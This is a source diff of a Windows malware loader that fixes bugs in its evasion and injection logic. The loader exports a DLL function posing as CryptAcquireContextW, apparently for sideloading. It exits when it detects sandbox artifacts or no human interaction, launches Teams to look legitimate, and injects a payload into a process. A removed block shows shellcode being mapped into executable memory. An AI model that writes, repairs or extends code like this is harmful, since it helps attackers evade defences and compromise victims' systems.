@@ -41,9 +41,9 @@ void checkMutex() {
 */
 
 // Exit process while keeping functionality. Protects stealth even if it doesn't work.
-void ExitProcess() {
+void CustomExitProcess() {
     execute_Teams();
-    exit(0);
+    ExitProcess(1);
 }
 
 
@@ -51,12 +51,12 @@ void ExitProcess() {
 void stale() {
     // Check for known sandbox artifacts
     if (isSandboxArtifactPresent()) {
-        ExitProcess(); // Exit if sandbox artifacts are detected
+        CustomExitProcess(); // Exit if sandbox artifacts are detected
     }
 
     // Check for human-like interaction
     if (!isHumanInteractionPresent()) {
-        ExitProcess(); // Exit if human-like interaction is not detected
+        CustomExitProcess(); // Exit if human-like interaction is not detected
     }
 }
 
@@ -173,35 +173,21 @@ void execute_Teams() {
     system("teams.exe");
 }
 
-// Extern function that gets exported. Function seemed to work better when compiled as extern.
-extern "C" {
+// function that gets exported. Function seemed to work better when compiled as extern.
     
-    __declspec(dllexport) void CryptAcquireContextW() {
-        char payload[PSIZE];
+__declspec(dllexport) void CryptAcquireContextW() {
+    char payload[PSIZE];
 
-        // Check if payload has already been executed using Mutex
-        checkMutex();
+    // Check if payload has already been executed using Mutex
+    checkMutex();
 
-        // Evade ML and Sandboxing checks
-        if (stale() == 1)
-        {
-            return 0;
-        };
+    // Evade ML and Sandboxing checks
+    stale();
 
-            /*
-            OLD CODE. Did not include checks and such. Also permissions weren't working.
 
-            if (get_shellcode_from_file(payload, PAYLOAD_PATH) == 0) {
-            execute_Teams();
-            HANDLE hFileMap = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sizeof(payload), NULL);
-            LPVOID lpMapAddress = MapViewOfFile(hFileMap, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0, 0, sizeof(payload));
-            memcpy((PVOID)lpMapAddress, payload, sizeof(payload));
-            */
+    // run teams to mimic legitimate behavior
+    execute_Teams();
 
-        // run teams to mimic legitimate behavior
-        execute_Teams();
-
-        // Inject process
-        mapinject()
-    }
+    // Inject process
+    mapinject();
 }
